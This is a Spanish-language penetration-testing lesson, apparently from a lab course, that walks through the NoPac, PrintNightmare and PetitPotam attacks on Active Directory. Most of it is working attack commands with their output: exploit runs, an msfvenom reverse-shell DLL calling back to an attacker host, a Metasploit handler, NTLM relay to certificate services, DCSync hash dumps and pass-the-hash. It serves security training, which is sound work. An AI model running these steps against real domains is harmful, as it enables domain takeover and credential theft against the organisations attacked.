
# Vulnerabilidades en AD

## Vulnerabilidades de vanguardia

Cuando se trata de administración y ciclos de parches, muchas organizaciones no se apresuran a implementar parches en sus redes. Debido a esto, es posible que podamos lograr una victoria rápida, ya sea para el acceso inicial o la escalada de privilegios de dominio, utilizando una táctica muy reciente. Al momento de escribir este artículo (abril de 2022), las tres técnicas que se muestran en esta sección son relativamente recientes (dentro de los últimos 6 a 9 meses). Estos son temas avanzados que no se pueden cubrir en profundidad en una sección del módulo.&#x20;

El propósito de demostrar estos ataques es permitir que los estudiantes prueben los últimos y mejores ataques en un entorno de laboratorio controlado y presenten temas que se cubrirán en profundidad en módulos más avanzados de Active Directory. Al igual que con cualquier ataque, si no comprende cómo funcionan o el riesgo que podrían representar para un entorno de producción, sería mejor no intentarlos durante una interacción con un cliente del mundo real.&#x20;

Dicho esto, estas técnicas podrían considerarse "seguras" y menos destructivas que ataques como [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) o [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/) . Aun así, siempre debemos tener cuidado, tomar notas detalladas y comunicarnos con nuestros clientes. Todos los ataques conllevan un riesgo. Por ejemplo, el ataque `PrintNightmare` podría potencialmente bloquear el servicio de cola de impresión en un host remoto y causar una interrupción del servicio.

Como profesionales de la seguridad de la información en un campo que cambia y evoluciona rápidamente, debemos mantenernos alerta y al tanto de los ataques recientes y las nuevas herramientas y técnicas. Recomendamos probar todas las técnicas de esta sección y realizar investigaciones adicionales para encontrar otros métodos para realizar estos ataques. Ahora, profundicemos.

***

## <mark style="color:purple;">NoPac (SamAccountName Spoofing)</mark>

Un gran ejemplo de una amenaza emergente es la [vulnerabilidad Sam\_The\_Admin](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699) , también llamada `noPac` o mencionada como tal, `SamAccountName Spoofing` lanzada a fines de 2021. Esta vulnerabilidad abarca dos CVE [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) y [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) , que permiten la escalada de privilegios dentro del dominio desde cualquier usuario de dominio estándar hasta el acceso de nivel de administrador de dominio con un solo comando. A continuación, se incluye un breve resumen de lo que ofrece cada CVE con respecto a esta vulnerabilidad.

| 42278                                                                                          | 42287                                                                                                 |
| ---------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `42278`Es una vulnerabilidad de derivación con el Administrador de cuentas de seguridad (SAM). | `42287`es una vulnerabilidad dentro del Certificado de atributo de privilegio Kerberos (PAC) en ADDS. |

Esta ruta de explotación aprovecha la posibilidad de cambiar la cuenta `SamAccountName` de una computadora a la de un controlador de dominio. De forma predeterminada, los usuarios autenticados pueden agregar hasta [diez computadoras a un dominio](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain) . Al hacerlo, cambiamos el nombre del nuevo host para que coincida con el SamAccountName de un controlador de dominio. Una vez hecho esto, debemos solicitar tickets de Kerberos para que el servicio nos emita tickets con el nombre del controlador de dominio en lugar del nuevo nombre. Cuando se solicita un TGS, emitirá el ticket con el nombre más parecido. Una vez hecho esto, tendremos acceso como ese servicio e incluso se nos puede proporcionar un shell SYSTEM en un controlador de dominio. El flujo del ataque se describe en detalle en esta [publicación del blog](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware) .

Podemos utilizar esta [herramienta](https://github.com/Ridter/noPac) para realizar este ataque. Esta herramienta está presente en el host ATTACK01 en `/opt/noPac`.

NoPac utiliza muchas herramientas de Impacket para comunicarse con el host de ataque, cargar una carga útil y emitir comandos desde el host de ataque al controlador de dominio objetivo. Antes de intentar usar el exploit, debemos asegurarnos de que Impacket esté instalado y que el repositorio de exploits de NoPac esté clonado en nuestro host de ataque, si es necesario. Podemos usar estos comandos para hacerlo:

**Cómo asegurarse de que Impacket esté instalado**

```shell-session
afsh4ck@kali$ git clone https://github.com/SecureAuthCorp/impacket.git
```

```shell-session
afsh4ck@kali$ python setup.py install
```

**Clonación del repositorio de exploits NoPac**

```shell-session
afsh4ck@kali$ git clone https://github.com/Ridter/noPac.git
```

Una vez que Impacket está instalado y nos aseguramos de que el repositorio esté clonado en nuestro cuadro de ataque, podemos usar los scripts en el directorio NoPac para verificar si el sistema es vulnerable usando un escáner ( `scanner.py`) y luego usar el exploit ( `noPac.py`) para obtener un shell como `NT AUTHORITY/SYSTEM`.&#x20;

Podemos usar el escáner con una cuenta de usuario de dominio estándar para intentar obtener un TGT del controlador de dominio de destino. Si tiene éxito, esto indica que el sistema es, de hecho, vulnerable. También notaremos que el número `ms-DS-MachineAccountQuota` está configurado en 10. En algunos entornos, un administrador de sistemas astuto puede configurar el valor `ms-DS-MachineAccountQuota` en 0. Si este es el caso, el ataque fallará porque nuestro usuario no tendrá los derechos para agregar una nueva cuenta de máquina. Configurar esto en `0` puede prevenir bastantes ataques de AD.

### **Escaneando en busca de NoPac**

```shell-session
afsh4ck@kali$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Existen muchas formas diferentes de utilizar NoPac para mejorar nuestro acceso. Una de ellas es obtener un shell con privilegios de nivel `SYSTEM`. Podemos hacerlo ejecutando `noPac.py` con la sintaxis que se muestra a continuación para suplantar la cuenta de administrador integrada y acceder a una sesión de shell semi interactiva en el controlador de dominio de destino. Esto podría ser "ruidoso" o podría estar bloqueado por AV o EDR.

### **Ejecutar NoPac y obtener un shell**

```shell-session
afsh4ck@kali$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                               
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

Notaremos que se establece un `semi-interactive shell session` con el objetivo mediante [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) . Tenga en cuenta que con los shells smbexec necesitaremos usar rutas exactas en lugar de navegar por la estructura de directorios mediante `cd`.

Es importante tener en cuenta que NoPac.py guarda el TGT en el directorio del host de ataque donde se ejecutó el exploit. Podemos usar `ls` para confirmarlo.

**Confirmación de la ubicación de los tickets guardados**

```shell-session
afsh4ck@kali$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

Podríamos usar el archivo ccache para realizar un pass-the-ticket y realizar otros ataques como DCSync. También podemos usar la herramienta con el indicador `-dump` para realizar un DCSync usando secretsdump.py. Este método crearía un archivo ccache en el disco, del cual querríamos estar al tanto y limpiar.

### **Uso de noPac para sincronizar con DCSync la cuenta de administrador integrada**

```shell-session
afsh4ck@kali$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

***

## <mark style="color:purple;">Consideraciones sobre Windows Defender y SMBEXEC.py</mark>

Si Windows Defender (u otro producto AV o EDR) está habilitado en un objetivo, nuestra sesión de shell puede establecerse, pero es probable que no se pueda emitir ningún comando. Lo primero que hace smbexec.py es crear un servicio llamado `BTOBTO`. Se crea otro servicio llamado `BTOBO` , y cualquier comando que escribamos se envía al objetivo a través de SMB dentro de un archivo .bat llamado `execute.bat`. Con cada nuevo comando que escribamos, se crea un nuevo script por lotes y se hace eco en un archivo temporal que ejecuta dicho script y lo elimina del sistema. Veamos un registro de Windows Defender para ver qué comportamiento se consideró malicioso.

**Registro de cuarentena de Windows Defender**

![imagen](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

Si la seguridad operacional o el "silencio" son factores a tener en cuenta durante una evaluación, lo más probable es que queramos evitar una herramienta como smbexec.py. El enfoque de este módulo está en las tácticas y técnicas. Refinaremos nuestra metodología a medida que avancemos en módulos más avanzados, pero primero debemos obtener una base sólida para enumerar y atacar Active Directory.

***

## <mark style="color:purple;">PrintNightmare</mark>

`PrintNightmare` es el apodo que se le da a dos vulnerabilidades ( [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) y [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) ) que se encuentran en el [servicio Print Spooler](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) que se ejecuta en todos los sistemas operativos Windows. Se han escrito muchos exploits basados ​​en estas vulnerabilidades que permiten la escalada de privilegios y la ejecución remota de código. El uso de esta vulnerabilidad para la escalada de privilegios locales se trata en el módulo `Escalada de privilegios de Windows` , pero también es importante practicar dentro del contexto de los entornos de Active Directory para obtener acceso remoto a un host. Practiquemos con un exploit que puede permitirnos obtener una sesión de shell SYSTEM en un controlador de dominio que se ejecuta en un host de Windows Server 2019.

Antes de realizar este ataque, debemos recuperar el exploit que utilizaremos. En este caso, utilizaremos el exploit [de cube0x0](https://twitter.com/cube0x0?lang=en) . Podemos utilizar Git para clonarlo en nuestro host de ataque:

**Clonando el exploit**

```shell-session
afsh4ck@kali$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

Para que este exploit funcione correctamente, necesitaremos usar la versión de Impacket de cube0x0. Es posible que tengamos que desinstalar la versión de Impacket en nuestro host de ataque e instalar la de cube0x0 (esta ya está instalada en ATTACK01 en el laboratorio). Podemos usar los siguientes comandos para lograr esto:

**Instalar la versión de Impacket de cube0x0**

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Podemos usarlo `rpcdump.py`para ver si `Print System Asynchronous Protocol`y `Print System Remote Protocol`están expuestos en el objetivo.

**Enumeración para MS-RPRN**

```shell-session
afsh4ck@kali$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

Después de confirmar esto, podemos proceder a intentar usar el exploit. Podemos comenzar creando un payload DLL usando `msfvenom`.

**Generar un Payload DLL**

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

Luego alojaremos este payload en un recurso compartido SMB que crearemos en nuestro host de ataque usando `smbserver.py`.

**Creación de un recurso compartido con smbserver.py**

```shell-session
afsh4ck@kali$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez que se crea el recurso compartido y aloja nuestro payload, podemos usar Metasploit para configurar e iniciar un Multi Handler responsable de capturar el reverse shell que se ejecuta en el objetivo.

**Configuración e inicio de MSF multi/handler**

```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```

Con el recurso compartido que aloja nuestro payload y nuestro Multi Handler a la espera de una conexión, podemos intentar ejecutar el exploit contra el objetivo. El siguiente comando muestra cómo usamos el exploit:

**Ejecutando el exploit**

```shell-session
afsh4ck@kali$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

<SNIP>
```

Observe cómo al final del comando incluimos la ruta al recurso compartido que aloja nuestro payload ( `\\<ip-maquina-atacante>\ShareName\payload.dll`). Si todo va bien después de ejecutar el exploit, el objetivo accederá al recurso compartido y ejecutará el payload. El payload luego llamará a nuestro Multi Handler y nos proporcionará un shell con privilegios `SYSTEM`.

**Obteniendo el shell SYSTEM**

```bash
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Una vez que se haya ejecutado el exploit, notaremos que se ha iniciado una sesión de Meterpreter. Luego podemos ingresar a un shell SYSTEM y ver que tenemos privilegios NT AUTHORITY\SYSTEM en el controlador de dominio de destino a partir de una cuenta de usuario de dominio estándar.

***

## <mark style="color:purple;">PetitPotam (MS-EFSRPC)</mark>

PetitPotam ( [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) ) es una vulnerabilidad de suplantación de LSA que se solucionó en agosto de 2021. La falla permite a un atacante no autenticado obligar a un controlador de dominio a autenticarse contra otro host que usa NTLM a través del puerto 445 mediante el [Protocolo remoto de autoridad de seguridad local (LSARPC) al abusar ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc)[del Protocolo remoto del sistema de archivos de cifrado](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) de Microsoft (MS-EFSRPC) . Esta técnica permite a un atacante no autenticado tomar el control de un dominio de Windows donde se utilizan [los Servicios de certificados de Active Directory (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) . En el ataque, una solicitud de autenticación del controlador de dominio objetivo se retransmite a la página de inscripción web del host de la autoridad de certificación (CA) y realiza una solicitud de firma de certificado (CSR) para un nuevo certificado digital. Luego, este certificado se puede usar con una herramienta como `Rubeus` o `gettgtpkinit.py` desde [PKINITtools](https://github.com/dirkjanm/PKINITtools) para solicitar un TGT para el controlador de dominio, que luego se puede usar para lograr la vulneración del dominio a través de un ataque DCSync.

[Esta](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) publicación de blog brinda más detalles sobre la retransmisión NTLM a AD CS y el ataque PetitPotam.

Analicemos el ataque. En primer lugar, debemos comenzar `ntlmrelayx.py` en una ventana de nuestro host de ataque, especificando la URL de inscripción web para el host de CA y utilizando la plantilla AD CS de KerberosAuthentication o DomainController. Si no supiéramos la ubicación de la CA, podríamos utilizar una herramienta como [certi](https://github.com/zer1t0/certi) para intentar localizarla.

### **Iniciando ntlmrelayx.py**

```shell-session
afsh4ck@kali$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - 

Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```

En otra ventana, podemos ejecutar la herramienta [PetitPotam.py](https://github.com/topotam/PetitPotam) . Ejecutamos esta herramienta con el comando `python3 PetitPotam.py <IP Atacante> <IP Domain Controller>` para intentar obligar al controlador de dominio a autenticarse en nuestro host donde se ejecuta ntlmrelayx.py.

Existe una versión ejecutable de esta herramienta que se puede ejecutar desde un host de Windows. El disparador de autenticación también se ha agregado a Mimikatz y se puede ejecutar de la siguiente manera utilizando el módulo del sistema de archivos cifrados (EFS): `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. También existe una implementación de PowerShell de la herramienta [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1) .

Aquí ejecutamos la herramienta e intentamos forzar la autenticación a través del método [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) .

### **Ejecutando PetitPotam.py**

```shell-session
afsh4ck@kali$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                 
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!

[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

### **Obtención de certificado codificado en Base64 para DC01**

En nuestra otra ventana, veremos una solicitud de inicio de sesión exitosa y obtendremos el certificado codificado en base64 para el controlador de dominio si el ataque es exitoso.

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6z/QuWp2pWrXS9zwt7bc1SQpMcCjfiFalKIlpPQQiti7xvTMokV+X6YlhUokM9yz3jTAU0ylvw82LoKsKMCKVx0mnhVDUlxR+i1Irn4piInOVfY0c2IAGDdJViVdXgQ7njtkg0R+Ab0CWrqLCtG6nVPIJbxFE5O84s+P3xMBgYoN4cj/06whmVPNyUHfKUbe5ySDnTwREhrFR4DE7kVWwTvkzlS0K8Cqoik7pUlrgIdwRUX438E+bhix+NEa+fW7+rMDrLA4gAvg3C7O8OPYUg<------SNIP------>
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed

<SNIP>
```

{% endcode %}

### **Solicitar un TGT mediante gettgtpkinit.py**

A continuación, podemos tomar este certificado base64 y usarlo `gettgtpkinit.py` para solicitar un ticket de concesión de tickets (TGT) para el controlador de dominio.

```shell-session
afsh4ck@kali$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

### **Configuración de la variable de entorno KRB5CCNAME**

El TGT solicitado anteriormente se guardó en el archivo `dc01.ccache` que usamos para configurar la variable de entorno KRB5CCNAME, por lo que nuestro host de ataque usa este archivo para los intentos de autenticación Kerberos.

```shell-session
afsh4ck@kali$ export KRB5CCNAME=dc01.ccache
```

### **Uso del controlador de dominio TGT para DCSync**

Luego podemos usar este TGT para realizar un DCSYnc con `secretsdump.py` y recuperar uno o todos los hashes de contraseña NTLM para el dominio.

```shell-session
afsh4ck@kali$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up... 
```

También podríamos usar un comando más sencillo: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` porque la herramienta recuperará el nombre de usuario del archivo ccache. Podemos comprobarlo escribiendo `klist`(el uso del comando `klist` requiere la instalación del paquete [krb5-user](https://packages.ubuntu.com/focal/krb5-user) en nuestro host de ataque).

#### Klist

```shell-session
afsh4ck@kali$ klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

### **Confirmación del acceso de administrador al controlador de dominio**

Por último, podríamos utilizar el hash NT de la cuenta de administrador integrada para autenticarnos en el controlador de dominio. Desde aquí, tenemos control total sobre el dominio y podríamos intentar establecer persistencia, buscar datos confidenciales, buscar otras configuraciones incorrectas y vulnerabilidades para nuestro informe o comenzar a enumerar relaciones de confianza.

```shell-session
afsh4ck@kali$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

